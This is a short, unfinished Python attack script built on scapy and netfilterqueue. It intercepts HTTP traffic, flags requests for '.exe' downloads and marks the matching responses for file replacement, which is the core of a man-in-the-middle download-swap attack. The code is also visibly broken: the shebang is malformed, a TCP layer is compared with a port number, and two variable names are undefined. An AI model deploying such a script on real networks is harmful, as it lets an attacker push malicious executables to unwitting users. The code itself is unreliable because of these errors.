#!usr/bin/env python
import scapy.all as scapy
import netfilterqueue

ackList = []

def process_packet(packet):
    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.Raw):
        if scapyPacket[scapy.TCP].dport == 80:
            print("HTTP Req")
            if ".exe" in scapyPacket[scapy.Raw].load:
                print("[+] exe Req")
                ackList.append(scapyPacket[scapy.TCP].ack)
        elif scapyPacket[scapy.TCP] == 80:
            print("HTTP Res")
            if scapyPacket[scapy.TCP].seq in ack_list:
                ackList.remove(scapyPacket[scapy.TCP].seq)
                print("[+] Replacing file")
                print(scapy_packet.show())
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
